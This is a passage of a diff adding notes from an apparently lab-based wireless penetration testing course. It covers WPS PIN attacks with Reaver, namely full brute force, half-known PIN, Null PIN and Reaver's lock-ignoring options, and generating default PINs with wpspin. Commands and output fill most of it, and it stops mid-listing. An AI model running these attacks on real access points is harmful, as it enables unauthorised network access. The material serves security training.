+mon0      IEEE <span class="hljs-number">802.11</span>  Mode:Monitor  Tx-Power=<span class="hljs-number">20</span> dBm   
+          Retry short limit:<span class="hljs-number">7</span>   RTS thr:<span class="hljs-literal">off</span>   Fragment thr:<span class="hljs-literal">off</span>
+          Power Management:<span class="hljs-literal">on</span>
+
+wlan0     IEEE <span class="hljs-number">802.11</span>  ESSID:<span class="hljs-literal">off</span>/any  
+          Mode:Managed  Access Point: Not-Associated   Tx-Power=<span class="hljs-number">20</span> dBm   
+          Retry short limit:<span class="hljs-number">7</span>   RTS thr:<span class="hljs-literal">off</span>   Fragment thr:<span class="hljs-literal">off</span>
+          Encryption key:<span class="hljs-literal">off</span>
+          Power Management:<span class="hljs-literal">on</span>
+</code></pre>
+<p>Once we've added an interface with monitor mode enabled, we can use <code>airodump-ng</code> to enumerate WPS enabled WiFi networks.</p>
+<p>  Online PIN Brute-Forcing Using Reaver</p>
+<pre><code class="lang-shell-session">rootlrahmanTamim@htb[/htb]$ airodump-ng mon0 --wps
+
+ CH <span class="hljs-number"> 8 </span>][ Elapsed:<span class="hljs-number"> 0 </span>s ][ 2024-06-26 10:06 
+
+ BSSID              PWR  Beacons    <span class="hljs-comment">#Data, #/s  CH   MB   ENC CIPHER  AUTH WPS    ESSID</span>
+
+ AE:EB:B0:11:A0:1E  -28      <span class="hljs-number"> 11 </span>      <span class="hljs-number"> 0 </span>  <span class="hljs-number"> 0 </span> <span class="hljs-number"> 1 </span> <span class="hljs-number"> 54 </span>  WPA2 CCMP   PSK  2.0    HackMe   
+ B2:A5:1D:E1:B2:11  -28      <span class="hljs-number"> 11 </span>      <span class="hljs-number"> 0 </span>  <span class="hljs-number"> 0 </span> <span class="hljs-number"> 1 </span> <span class="hljs-number"> 54 </span>  WPA2 CCMP   PSK  2.0    GammerZone
+ 5A:1A:59:B7:E7:97  -28      <span class="hljs-number"> 11 </span>      <span class="hljs-number"> 0 </span>  <span class="hljs-number"> 0 </span> <span class="hljs-number"> 1 </span> <span class="hljs-number"> 54 </span>  WPA2 CCMP   PSK  2.0    Teddy      
+
+ BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
+</code></pre>
+<p>Now we can start bruteforcing using Reaver. To begin, we need to specify the interface with the <code>-i</code> argument, the BSSID with the <code>-b</code> argument, and the channel with the <code>-c</code> argument. Reaver will then automatically begin bruteforcing every possible PIN, which totals <code>11,000</code> possible PINs.</p>
+<p>  Online PIN Brute-Forcing Using Reaver</p>
+<pre><code class="lang-shell-session">rootlrahmanTamim<span class="hljs-meta">@htb</span>[/htb]$ reaver -i mon0 -b <span class="hljs-string">AE:</span><span class="hljs-string">EB:</span><span class="hljs-string">B0:</span><span class="hljs-number">11</span>:<span class="hljs-string">A0:</span><span class="hljs-number">1</span>E -c <span class="hljs-number">1</span> 
+
+Reaver v1<span class="hljs-number">.6</span><span class="hljs-number">.5</span> WiFi Protected Setup Attack Tool
+Copyright (c) <span class="hljs-number">2011</span>, Tactical Network Solutions, Craig Heffner &lt;cheffner<span class="hljs-meta">@tacnetsol</span>.com&gt;
+
+[+] Waiting <span class="hljs-keyword">for</span> beacon from <span class="hljs-string">AE:</span><span class="hljs-string">EB:</span><span class="hljs-string">B0:</span><span class="hljs-number">11</span>:<span class="hljs-string">A0:</span><span class="hljs-number">1</span>E
+[+] Received beacon from <span class="hljs-string">AE:</span><span class="hljs-string">EB:</span><span class="hljs-string">B0:</span><span class="hljs-number">11</span>:<span class="hljs-string">A0:</span><span class="hljs-number">1</span>E
+[!] Found packet with bad FCS, skipping...
+[+] Associated with <span class="hljs-string">AE:</span><span class="hljs-string">EB:</span><span class="hljs-string">B0:</span><span class="hljs-number">11</span>:<span class="hljs-string">A0:</span><span class="hljs-number">1</span>E (<span class="hljs-string">ESSID:</span> HackMe)
+[+] Associated with <span class="hljs-string">AE:</span><span class="hljs-string">EB:</span><span class="hljs-string">B0:</span><span class="hljs-number">11</span>:<span class="hljs-string">A0:</span><span class="hljs-number">1</span>E (<span class="hljs-string">ESSID:</span> HackMe)
+[+] Associated with <span class="hljs-string">AE:</span><span class="hljs-string">EB:</span><span class="hljs-string">B0:</span><span class="hljs-number">11</span>:<span class="hljs-string">A0:</span><span class="hljs-number">1</span>E (<span class="hljs-string">ESSID:</span> HackMe)
+[+] WPS <span class="hljs-string">PIN:</span> <span class="hljs-string">'96457896'</span>
+[+] WPA <span class="hljs-string">PSK:</span> <span class="hljs-string">'&lt;SNIP&gt;'</span>
+[+] AP <span class="hljs-string">SSID:</span> <span class="hljs-string">'HackMe'</span>
+</code></pre>
+<hr>
+<h4 id="bruteforcing-using-half-known-wps-pin">Bruteforcing using half known WPS PIN</h4>
+<p>If we know the first four digits of the WPS PIN, we can use Reaver to bruteforce the remaining four digits. We can provide the known half PIN using the <code>-p</code> option followed by the first four digits. For example, if the known first half of the PIN is 1234, we would use <code>-p 1234</code>.</p>
+<p>  Online PIN Brute-Forcing Using Reaver</p>
+<pre><code class="lang-shell-session">rootlrahmanTamim<span class="hljs-meta">@htb</span>[/htb]$ reaver -i mon0 -b <span class="hljs-string">B2:</span><span class="hljs-string">A5:</span><span class="hljs-number">1</span><span class="hljs-string">D:</span><span class="hljs-string">E1:</span><span class="hljs-string">B2:</span><span class="hljs-number">11</span> -c <span class="hljs-number">1</span> -p <span class="hljs-number">1234</span>
+
+Reaver v1<span class="hljs-number">.6</span><span class="hljs-number">.5</span> WiFi Protected Setup Attack Tool
+Copyright (c) <span class="hljs-number">2011</span>, Tactical Network Solutions, Craig Heffner &lt;cheffner<span class="hljs-meta">@tacnetsol</span>.com&gt;
+
+[+] Waiting <span class="hljs-keyword">for</span> beacon from <span class="hljs-string">B2:</span><span class="hljs-string">A5:</span><span class="hljs-number">1</span><span class="hljs-string">D:</span><span class="hljs-string">E1:</span><span class="hljs-string">B2:</span><span class="hljs-number">11</span>
+[+] Received beacon from <span class="hljs-string">B2:</span><span class="hljs-string">A5:</span><span class="hljs-number">1</span><span class="hljs-string">D:</span><span class="hljs-string">E1:</span><span class="hljs-string">B2:</span><span class="hljs-number">11</span>
+[!] Found packet with bad FCS, skipping...
+[+] Associated with <span class="hljs-string">B2:</span><span class="hljs-string">A5:</span><span class="hljs-number">1</span><span class="hljs-string">D:</span><span class="hljs-string">E1:</span><span class="hljs-string">B2:</span><span class="hljs-number">11</span> (<span class="hljs-string">ESSID:</span> GammerZone)
+[+] Associated with <span class="hljs-string">B2:</span><span class="hljs-string">A5:</span><span class="hljs-number">1</span><span class="hljs-string">D:</span><span class="hljs-string">E1:</span><span class="hljs-string">B2:</span><span class="hljs-number">11</span> (<span class="hljs-string">ESSID:</span> GammerZone)
+[+] Associated with <span class="hljs-string">B2:</span><span class="hljs-string">A5:</span><span class="hljs-number">1</span><span class="hljs-string">D:</span><span class="hljs-string">E1:</span><span class="hljs-string">B2:</span><span class="hljs-number">11</span> (<span class="hljs-string">ESSID:</span> GammerZone)
+[+] Associated with <span class="hljs-string">B2:</span><span class="hljs-string">A5:</span><span class="hljs-number">1</span><span class="hljs-string">D:</span><span class="hljs-string">E1:</span><span class="hljs-string">B2:</span><span class="hljs-number">11</span> (<span class="hljs-string">ESSID:</span> GammerZone)
+[+] Associated with <span class="hljs-string">B2:</span><span class="hljs-string">A5:</span><span class="hljs-number">1</span><span class="hljs-string">D:</span><span class="hljs-string">E1:</span><span class="hljs-string">B2:</span><span class="hljs-number">11</span> (<span class="hljs-string">ESSID:</span> GammerZone)
+[+] Associated with <span class="hljs-string">B2:</span><span class="hljs-string">A5:</span><span class="hljs-number">1</span><span class="hljs-string">D:</span><span class="hljs-string">E1:</span><span class="hljs-string">B2:</span><span class="hljs-number">11</span> (<span class="hljs-string">ESSID:</span> GammerZone)
+[+] <span class="hljs-number">90.91</span>% complete @ <span class="hljs-number">2024</span><span class="hljs-number">-06</span><span class="hljs-number">-21</span> <span class="hljs-number">11</span>:<span class="hljs-number">32</span>:<span class="hljs-number">33</span> (<span class="hljs-number">0</span> seconds/pin)
+[+] Associated with <span class="hljs-string">B2:</span><span class="hljs-string">A5:</span><span class="hljs-number">1</span><span class="hljs-string">D:</span><span class="hljs-string">E1:</span><span class="hljs-string">B2:</span><span class="hljs-number">11</span> (<span class="hljs-string">ESSID:</span> GammerZone)
+[+] Associated with <span class="hljs-string">B2:</span><span class="hljs-string">A5:</span><span class="hljs-number">1</span><span class="hljs-string">D:</span><span class="hljs-string">E1:</span><span class="hljs-string">B2:</span><span class="hljs-number">11</span> (<span class="hljs-string">ESSID:</span> GammerZone)
+[+] Associated with <span class="hljs-string">B2:</span><span class="hljs-string">A5:</span><span class="hljs-number">1</span><span class="hljs-string">D:</span><span class="hljs-string">E1:</span><span class="hljs-string">B2:</span><span class="hljs-number">11</span> (<span class="hljs-string">ESSID:</span> GammerZone)
+[+] Associated with <span class="hljs-string">B2:</span><span class="hljs-string">A5:</span><span class="hljs-number">1</span><span class="hljs-string">D:</span><span class="hljs-string">E1:</span><span class="hljs-string">B2:</span><span class="hljs-number">11</span> (<span class="hljs-string">ESSID:</span> GammerZone)
+[+] Associated with <span class="hljs-string">B2:</span><span class="hljs-string">A5:</span><span class="hljs-number">1</span><span class="hljs-string">D:</span><span class="hljs-string">E1:</span><span class="hljs-string">B2:</span><span class="hljs-number">11</span> (<span class="hljs-string">ESSID:</span> GammerZone)
+[+] <span class="hljs-number">91.48</span>% complete @ <span class="hljs-number">2024</span><span class="hljs-number">-06</span><span class="hljs-number">-21</span> <span class="hljs-number">11</span>:<span class="hljs-number">34</span>:<span class="hljs-number">23</span> (<span class="hljs-number">1</span> seconds/pin)
+[+] Associated with <span class="hljs-string">B2:</span><span class="hljs-string">A5:</span><span class="hljs-number">1</span><span class="hljs-string">D:</span><span class="hljs-string">E1:</span><span class="hljs-string">B2:</span><span class="hljs-number">11</span> (<span class="hljs-string">ESSID:</span> GammerZone)
+[+] Associated with <span class="hljs-string">B2:</span><span class="hljs-string">A5:</span><span class="hljs-number">1</span><span class="hljs-string">D:</span><span class="hljs-string">E1:</span><span class="hljs-string">B2:</span><span class="hljs-number">11</span> (<span class="hljs-string">ESSID:</span> GammerZone)
+[+] Associated with <span class="hljs-string">B2:</span><span class="hljs-string">A5:</span><span class="hljs-number">1</span><span class="hljs-string">D:</span><span class="hljs-string">E1:</span><span class="hljs-string">B2:</span><span class="hljs-number">11</span> (<span class="hljs-string">ESSID:</span> GammerZone)
+[+] Associated with <span class="hljs-string">B2:</span><span class="hljs-string">A5:</span><span class="hljs-number">1</span><span class="hljs-string">D:</span><span class="hljs-string">E1:</span><span class="hljs-string">B2:</span><span class="hljs-number">11</span> (<span class="hljs-string">ESSID:</span> GammerZone)
+[+] WPS <span class="hljs-string">PIN:</span> <span class="hljs-string">'12345678'</span>
+[+] WPA <span class="hljs-string">PSK:</span> <span class="hljs-string">'&lt;SNIP&gt;'</span>
+[+] AP <span class="hljs-string">SSID:</span> <span class="hljs-string">'GammerZone'</span>
+</code></pre>
+<hr>
+<h4 id="testing-for-null-pin">Testing for Null PIN</h4>
+<p>Suppose neither of these succeed, we could also attempt a <code>Null PIN</code> attack. Some access points are vulnerable to Null PIN attacks and will even disclose the WPA-PSK when no PIN is sent. We can do so by employing the following command, specifying the Null PIN with <code>-p ""</code> or <code>-p " "</code>.</p>
+<p>  Online PIN Brute-Forcing Using Reaver</p>
+<pre><code class="lang-shell-session">rootlrahmanTamim<span class="hljs-meta">@htb</span>[/htb]$ reaver -b <span class="hljs-number">5</span><span class="hljs-string">A:</span><span class="hljs-number">1</span><span class="hljs-string">A:</span><span class="hljs-number">59</span>:<span class="hljs-string">B7:</span><span class="hljs-string">E7:</span><span class="hljs-number">97</span> -c <span class="hljs-number">1</span> -i mon0 -p <span class="hljs-string">" "</span>
+
+Reaver v1<span class="hljs-number">.6</span><span class="hljs-number">.5</span> WiFi Protected Setup Attack Tool
+Copyright (c) <span class="hljs-number">2011</span>, Tactical Network Solutions, Craig Heffner &lt;cheffner<span class="hljs-meta">@tacnetsol</span>.com&gt;
+
+[+] Waiting <span class="hljs-keyword">for</span> beacon from <span class="hljs-number">5</span><span class="hljs-string">A:</span><span class="hljs-number">1</span><span class="hljs-string">A:</span><span class="hljs-number">59</span>:<span class="hljs-string">B7:</span><span class="hljs-string">E7:</span><span class="hljs-number">97</span>
+[+] Received beacon from <span class="hljs-number">5</span><span class="hljs-string">A:</span><span class="hljs-number">1</span><span class="hljs-string">A:</span><span class="hljs-number">59</span>:<span class="hljs-string">B7:</span><span class="hljs-string">E7:</span><span class="hljs-number">97</span>
+[!] Found packet with bad FCS, skipping...
+[+] Associated with <span class="hljs-number">5</span><span class="hljs-string">A:</span><span class="hljs-number">1</span><span class="hljs-string">A:</span><span class="hljs-number">59</span>:<span class="hljs-string">B7:</span><span class="hljs-string">E7:</span><span class="hljs-number">97</span> (<span class="hljs-string">ESSID:</span> Teddy)
+[+] WPS <span class="hljs-string">PIN:</span> <span class="hljs-string">' '</span>
+[+] WPA <span class="hljs-string">PSK:</span> <span class="hljs-string">'&lt;SNIP&gt;'</span>
+[+] AP <span class="hljs-string">SSID:</span> <span class="hljs-string">'Teddy'</span>
+</code></pre>
+<hr>
+<h4 id="retrieving-wpa-psk-using-reaver-with-a-known-pin">Retrieving WPA-PSK using Reaver with a Known PIN</h4>
+<p>If one of our brute forcing attempts succeeds, we can use the following command to verify the captured PIN. In this command, <code>-p</code> specifies the PIN, and <code>-b</code> specifies the BSSID of the target Wi-Fi network:</p>
+<p>  Online PIN Brute-Forcing Using Reaver</p>
+<pre><code class="lang-shell-session">rootlrahmanTamim<span class="hljs-meta">@htb</span>[/htb]$ sudo reaver -i mon0 -b <span class="hljs-number">60</span>:<span class="hljs-number">38</span>:<span class="hljs-string">E0:</span><span class="hljs-number">2</span><span class="hljs-string">A:</span><span class="hljs-number">4</span><span class="hljs-string">F:</span><span class="hljs-number">21</span> -p <span class="hljs-number">88766197</span>
+
+&lt;snip&gt;
+[+] Pin Cracked <span class="hljs-keyword">in</span> <span class="hljs-number">5</span> seconds
+[+] WPS <span class="hljs-string">PIN:</span> <span class="hljs-string">'88766197'</span>
+[+] WPS <span class="hljs-string">PSK:</span> <span class="hljs-string">'WPS-Attacks'</span>
+[+] AP <span class="hljs-string">SSID:</span> <span class="hljs-string">'HTB-Wireless'</span>
+</code></pre>
+<p>Alternatively, if the access point has a label with the PIN physically printed on the backside of the router, we can use this information to retrieve the WPA-PSK for the WiFi network. This method leverages the default PIN provided by the manufacturer to potentially gain access to the network. For the technique of using the PIN printed on the label to retrieve the WPA-PSK, the access point (AP) must be in label mode.</p>
+<p> <em><strong>It is recommended to enable monitor mode using iw to utilize reaver.</strong></em></p>
+<hr>
+<h2 id="secured-access-points">Secured Access Points</h2>
+<hr>
+<p>Traditionally, online brute-forcing attempts have been utilized in retrieving the WPS PIN and WPA-PSK. However, in recent years, manufacturers have become wiser to these attacks. As such, locking has been utilized to prevent these traditional bruteforcing techniques. The most recent vendors only allow up to 3 incorrect attempts. After each incorrect attempt, the AP will lock for 60 seconds. After 10 incorrect attempts, the AP will lock for 365 days.</p>
+<p>Let's first enable monitor mode using the <code>iw</code> command and add a new interface named <code>mon0</code> in monitor mode.</p>
+<p>  Secured Access Points</p>
+<pre><code class="lang-shell-session">rootlrahmanTamim@htb[/htb]$ iw dev wlan0 interface add mon0 type monitor
+
+rootlrahmanTamim@htb[/htb]$ ifconfig mon0 up
+
+rootlrahmanTamim@htb[/htb]$ iwconfig
+
+lo        <span class="hljs-literal">no</span> wireless extensions.
+
+eth0      <span class="hljs-literal">no</span> wireless extensions.
+
+mon0      IEEE <span class="hljs-number">802.11</span>  Mode:Monitor  Tx-Power=<span class="hljs-number">20</span> dBm   
+          Retry short limit:<span class="hljs-number">7</span>   RTS thr:<span class="hljs-literal">off</span>   Fragment thr:<span class="hljs-literal">off</span>
+          Power Management:<span class="hljs-literal">on</span>
+
+wlan0     IEEE <span class="hljs-number">802.11</span>  ESSID:<span class="hljs-literal">off</span>/any  
+          Mode:Managed  Access Point: Not-Associated   Tx-Power=<span class="hljs-number">20</span> dBm   
+          Retry short limit:<span class="hljs-number">7</span>   RTS thr:<span class="hljs-literal">off</span>   Fragment thr:<span class="hljs-literal">off</span>
+          Encryption key:<span class="hljs-literal">off</span>
+          Power Management:<span class="hljs-literal">on</span>
+</code></pre>
+<p>Then, we can use <code>airodump-ng</code> to continuously scan for the WPS status of nearby networks.</p>
+<p>  Secured Access Points</p>
+<pre><code class="lang-shell-session">rootlrahmanTamim@htb[/htb]$ airodump-ng mon0 --wps -c 1
+
+
+ CH <span class="hljs-number"> 1 </span>][ Elapsed:<span class="hljs-number"> 1 </span>min ][ 2024-07-01 19:51 
+
+ BSSID              PWR  Beacons    <span class="hljs-comment">#Data, #/s  CH   MB   ENC CIPHER  AUTH WPS                ESSID</span>
+
+ 86:53:10:C3:1B:26  -28     <span class="hljs-number"> 555 </span>      <span class="hljs-number"> 0 </span>  <span class="hljs-number"> 0 </span> <span class="hljs-number"> 1 </span> <span class="hljs-number"> 54 </span>  WPA2 CCMP   PSK  2.0 LAB,DISP,KPAD  HackMe
+</code></pre>
+<p>In a new terminal, we can start the bruteforce attempt on the available WiFi network.</p>
+<p>  Secured Access Points</p>
+<pre><code class="lang-shell-session">rootlrahmanTamim<span class="hljs-meta">@htb</span>[/htb]$ reaver -i mon0 -c <span class="hljs-number">1</span> -b <span class="hljs-number">86</span>:<span class="hljs-number">53</span>:<span class="hljs-number">10</span>:<span class="hljs-string">C3:</span><span class="hljs-number">1</span><span class="hljs-string">B:</span><span class="hljs-number">26</span> -v
+
+Reaver v1<span class="hljs-number">.6</span><span class="hljs-number">.5</span> WiFi Protected Setup Attack Tool
+Copyright (c) <span class="hljs-number">2011</span>, Tactical Network Solutions, Craig Heffner &lt;cheffner<span class="hljs-meta">@tacnetsol</span>.com&gt;
+
+[+] Waiting <span class="hljs-keyword">for</span> beacon from <span class="hljs-number">86</span>:<span class="hljs-number">53</span>:<span class="hljs-number">10</span>:<span class="hljs-string">C3:</span><span class="hljs-number">1</span><span class="hljs-string">B:</span><span class="hljs-number">26</span>
+[+] Received beacon from <span class="hljs-number">86</span>:<span class="hljs-number">53</span>:<span class="hljs-number">10</span>:<span class="hljs-string">C3:</span><span class="hljs-number">1</span><span class="hljs-string">B:</span><span class="hljs-number">26</span>
+[+] Trying pin <span class="hljs-string">"12345670"</span>
+[!] Found packet with bad FCS, skipping...
+[+] Associated with <span class="hljs-number">86</span>:<span class="hljs-number">53</span>:<span class="hljs-number">10</span>:<span class="hljs-string">C3:</span><span class="hljs-number">1</span><span class="hljs-string">B:</span><span class="hljs-number">26</span> (<span class="hljs-string">ESSID:</span> HackMe)
+[+] Trying pin <span class="hljs-string">"00005678"</span>
+[+] Associated with <span class="hljs-number">86</span>:<span class="hljs-number">53</span>:<span class="hljs-number">10</span>:<span class="hljs-string">C3:</span><span class="hljs-number">1</span><span class="hljs-string">B:</span><span class="hljs-number">26</span> (<span class="hljs-string">ESSID:</span> HackMe)
+[+] Trying pin <span class="hljs-string">"01235678"</span>
+[+] Associated with <span class="hljs-number">86</span>:<span class="hljs-number">53</span>:<span class="hljs-number">10</span>:<span class="hljs-string">C3:</span><span class="hljs-number">1</span><span class="hljs-string">B:</span><span class="hljs-number">26</span> (<span class="hljs-string">ESSID:</span> HackMe)
+
+[!] <span class="hljs-string">WARNING:</span> Detected AP rate limiting, waiting <span class="hljs-number">60</span> seconds before re-checking
+</code></pre>
+<p>After three incorrect attempts, the AP will enter a <code>Locked</code> state for <code>60 seconds</code>. Each subsequent wrong PIN attempt will cause the AP to lock for another 60 seconds. However, after 10 incorrect attempts, the AP will lock for <code>365 days</code>.</p>
+<p>We can observe in the <code>airodump-ng</code> output that the access point goes into a <code>Locked</code> state.</p>
+<p>  Secured Access Points</p>
+<pre><code class="lang-shell-session">rootlrahmanTamim@htb[/htb]$ airodump-ng mon0 --wps -c 1
+
+
+ CH <span class="hljs-number"> 1 </span>][ Elapsed:<span class="hljs-number"> 48 </span>s ][ 2024-07-01 19:52 
+
+ BSSID              PWR RXQ  Beacons    <span class="hljs-comment">#Data, #/s  CH   MB   ENC CIPHER  AUTH WPS                ESSID</span>
+
+ 86:53:10:C3:1B:26  -28  <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 483 </span>     <span class="hljs-number"> 33 </span>  <span class="hljs-number"> 0 </span> <span class="hljs-number"> 1 </span> <span class="hljs-number"> 54 </span>  WPA2 CCMP   PSK Locked              HackMe
+</code></pre>
+<p>In some cases, vendors might have not implemented strict lock mechanisms, allowing us to continue bruteforcing using Reaver. The tool can be fine-tuned with additional advanced switches to optimize the bruteforce process, for example:</p>
+<table>
+<thead>
+<tr>
+<th><strong>Option</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>-L, --ignore-locks</code></td>
+<td>Ignore locked state reported by the target AP</td>
+</tr>
+<tr>
+<td><code>-N, --no-nacks</code></td>
+<td>Do not send NACK messages when out of order packets are received</td>
+</tr>
+<tr>
+<td><code>-d, --delay=&lt;seconds&gt;</code></td>
+<td>Set the delay between pin attempts [1]</td>
+</tr>
+<tr>
+<td><code>-T, --m57-timeout=&lt;seconds&gt;</code></td>
+<td>Set the M5/M7 timeout period [0.40]</td>
+</tr>
+<tr>
+<td><code>-r, --recurring-delay=&lt;x:y&gt;</code></td>
+<td>Sleep for y seconds every x pin attempts</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<p>With the latest models from certain vendors, when the access point reaches the 10th incorrect PIN attempt, it will lock for 365 days, preventing any further bruteforce attempts.</p>
+<p>  Secured Access Points</p>
+<pre><code class="lang-shell-session">rootlrahmanTamim<span class="hljs-meta">@htb</span>[/htb]$ reaver -i mon0 -c <span class="hljs-number">1</span> -b <span class="hljs-number">86</span>:<span class="hljs-number">53</span>:<span class="hljs-number">10</span>:<span class="hljs-string">C3:</span><span class="hljs-number">1</span><span class="hljs-string">B:</span><span class="hljs-number">26</span> -v
+
+Reaver v1<span class="hljs-number">.6</span><span class="hljs-number">.5</span> WiFi Protected Setup Attack Tool
+Copyright (c) <span class="hljs-number">2011</span>, Tactical Network Solutions, Craig Heffner &lt;cheffner<span class="hljs-meta">@tacnetsol</span>.com&gt;
+&lt;SNIP&gt;
+[+] Trying pin <span class="hljs-string">"77775672"</span>
+[+] Associated with <span class="hljs-number">86</span>:<span class="hljs-number">53</span>:<span class="hljs-number">10</span>:<span class="hljs-string">C3:</span><span class="hljs-number">1</span><span class="hljs-string">B:</span><span class="hljs-number">26</span> (<span class="hljs-string">ESSID:</span> HackMe)
+[!] <span class="hljs-string">WARNING:</span> Detected AP rate limiting, waiting <span class="hljs-number">60</span> seconds before re-checking
+[!] <span class="hljs-string">WARNING:</span> Detected AP rate limiting, waiting <span class="hljs-number">60</span> seconds before re-checking
+[!] <span class="hljs-string">WARNING:</span> Detected AP rate limiting, waiting <span class="hljs-number">60</span> seconds before re-checking
+[!] <span class="hljs-string">WARNING:</span> Detected AP rate limiting, waiting <span class="hljs-number">60</span> seconds before re-checking
+[!] <span class="hljs-string">WARNING:</span> Detected AP rate limiting, waiting <span class="hljs-number">60</span> seconds before re-checking
+[!] <span class="hljs-string">WARNING:</span> Detected AP rate limiting, waiting <span class="hljs-number">60</span> seconds before re-checking
+[!] <span class="hljs-string">WARNING:</span> Detected AP rate limiting, waiting <span class="hljs-number">60</span> seconds before re-checking
+[!] <span class="hljs-string">WARNING:</span> Detected AP rate limiting, waiting <span class="hljs-number">60</span> seconds before re-checking
+[!] <span class="hljs-string">WARNING:</span> Detected AP rate limiting, waiting <span class="hljs-number">60</span> seconds before re-checking
+[!] <span class="hljs-string">WARNING:</span> Detected AP rate limiting, waiting <span class="hljs-number">60</span> seconds before re-checking
+[!] <span class="hljs-string">WARNING:</span> Detected AP rate limiting, waiting <span class="hljs-number">60</span> seconds before re-checking
+[!] <span class="hljs-string">WARNING:</span> Detected AP rate limiting, waiting <span class="hljs-number">60</span> seconds before re-checking
+[!] <span class="hljs-string">WARNING:</span> Detected AP rate limiting, waiting <span class="hljs-number">60</span> seconds before re-checking
+</code></pre>
+<p>This leads us to ask the following questions when employing these brute-forcing techniques:</p>
+<ul>
+<li>Will the access point lock after 3 incorrect attempts?</li>
+<li>How long does the access point stay locked? (Different vendors have different locking time.)</li>
+<li>Would PIN generation algorithms allow us to refine the total amount of guesses? (Covered in the next section.)</li>
+</ul>
+<p>If the access point (AP) locks after three incorrect attempts, using PIN generation algorithms to narrow down the total number of guesses and create a custom wordlist can be beneficial. However, in some cases, we might get lucky and find the correct PIN within the first 10 bruteforce attempts, before the AP locks indefinitely. Gathering information on these questions through research and enumeration allows us to craft better attacks towards WPS services for access points. The better technique that we utilize, the lower our chances are of failure when attempting to retrieve the PSK through WPS.</p>
+<hr>
+<h2 id="using-multiple-pre-defined-pins">Using Multiple Pre-defined PINs</h2>
+<hr>
+<p>While it is possible to bruteforce the WPS PIN using <code>Reaver</code>, we can also use a custom wordlist of potential PINs. In this section, we will explore how to generate possible PINs for a WiFi network using <code>wpspin</code> and then create a custom bash script to bruteforce the access point with these PINs.</p>
+<hr>
+<h4 id="using-python-wpspin-to-generate-default-pins">Using Python WPSPin to Generate Default PINs</h4>
+<p>The <a href="https://github.com/drygdryg/wpspin">WPSPin</a> tool is a powerful tool that includes many different PIN generation algorithms. This tool allows us to once again provide the BSSID of our target network and receive a list of possible default PINs.</p>
+<p>To begin, we can install the tool from the source.</p>
+<p>  Using Multiple Pre-defined PINs</p>
+<pre><code class="lang-shell-session">rootlrahmanTamim<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ git clone https:/</span><span class="hljs-regexp">/github.com/</span>drygdryg/wpspin.git
+
+Cloning into <span class="hljs-string">'wpspin'</span>...
+<span class="hljs-string">remote:</span> Enumerating <span class="hljs-string">objects:</span> <span class="hljs-number">44</span>, done.
+<span class="hljs-string">remote:</span> Counting <span class="hljs-string">objects:</span> <span class="hljs-number">100</span>% (<span class="hljs-number">4</span>/<span class="hljs-number">4</span>), done.
+<span class="hljs-string">remote:</span> Compressing <span class="hljs-string">objects:</span> <span class="hljs-number">100</span>% (<span class="hljs-number">4</span>/<span class="hljs-number">4</span>), done.
+<span class="hljs-string">remote:</span> Total <span class="hljs-number">44</span> (delta <span class="hljs-number">0</span>), reused <span class="hljs-number">2</span> (delta <span class="hljs-number">0</span>), pack-reused <span class="hljs-number">40</span>
+Receiving <span class="hljs-string">objects:</span> <span class="hljs-number">100</span>% (<span class="hljs-number">44</span><span class="hljs-regexp">/44), 21.46 KiB | 499.00 KiB/</span>s, done.
+Resolving <span class="hljs-string">deltas:</span> <span class="hljs-number">100</span>% (<span class="hljs-number">10</span>/<span class="hljs-number">10</span>), done.
+</code></pre>
+<p>Then, we navigate into the tool's cloned directory and run the setup script to install WPSPin.</p>
+<p>  Using Multiple Pre-defined PINs</p>
+<pre><code class="lang-shell-session">rootlrahmanTamim@htb[/htb]$ cd wpspin
+rootlrahmanTamim@htb[/htb]$ sudo <span class="hljs-keyword">python</span> setup.py install
+</code></pre>
+<p>Note: <code>WPSPin</code> is already installed in the lab.</p>
+<p>Once WPSPin is installed, we can employ the following command to generate possible default PINs. We specify our <code>BSSID</code> and <code>-A</code> to generate any and all possible PINs.</p>
+<p>  Using Multiple Pre-defined PINs</p>
+<pre><code class="lang-shell-session">rootlrahmanTamim@htb[/htb]$ wpspin -<span class="hljs-keyword">A</span> <span class="hljs-number">60</span>:<span class="hljs-number">38</span>:E0:A2:<span class="hljs-number">3</span>D:<span class="hljs-number">2</span><span class="hljs-keyword">A</span>
+
+Found <span class="hljs-number">49</span> PIN(s)
+PIN        Name
+<span class="hljs-number">73834410</span>   <span class="hljs-number">44</span>-bit PIN
+<span class="hljs-number">94229882</span>   Static PIN — H108L
+<span class="hljs-number">73834410</span>   <span class="hljs-number">40</span>-bit PIN
+<span class="hljs-number">06490959</span>   Reverse bits <span class="hljs-number">32</span>-bit
+<span class="hljs-number">11184812</span>   <span class="hljs-number">24</span>-bit PIN
+<span class="hljs-number">63311501</span>   Reverse nibble <span class="hljs-number">32</span>-bit
+<span class="hljs-number">11184812</span>   <span class="hljs-number">28</span>-bit PIN
+<span class="hljs-number">36499373</span>   <span class="hljs-number">48</span>-bit PIN
+<span class="hljs-number">63313604</span>   Reverse byte <span class="hljs-number">32</span>-bit
+<span class="hljs-number">99956042</span>   Static PIN — Onlime
+<span class="hljs-number">95661469</span>   Static PIN — Realtek <span class="hljs-number">1</span>
+<span class="hljs-number">89478486</span>   Reverse bits <span class="hljs-number">24</span>-bit
+<span class="hljs-number">11184812</span>   Reverse nibble <span class="hljs-number">24</span>-bit
+           Empty PIN
+<span class="hljs-number">11184812</span>   Reverse byte <span class="hljs-number">24</span>-bit
+<span class="hljs-number">95755212</span>   Static PIN — CBN ONO
+<span class="hljs-number">20854836</span>   Static PIN — Upvel
+<span class="hljs-number">20144326</span>   Airocon Realtek
+<span class="hljs-number">33946153</span>   D-Link PIN +<span class="hljs-number">1</span>
+<span class="hljs-number">13142452</span>   ASUS PIN
+<span class="hljs-number">74163052</span>   OUI ^ NIC
+<span class="hljs-number">51875350</span>   OUI − NIC
+<span class="hljs-number">43977680</span>   Static PIN — UR-<span class="hljs-number">814</span>AC
+<span class="hljs-number">56587340</span>   Inv NIC to PIN
+<span class="hljs-number">95719115</span>   Static PIN — Realtek <span class="hljs-number">2</span>
+<span class="hljs-number">48563710</span>   Static PIN — Realtek <span class="hljs-number">3</span>
+<span class="hljs-number">92148659</span>   <span class="hljs-number">32</span>-bit PIN
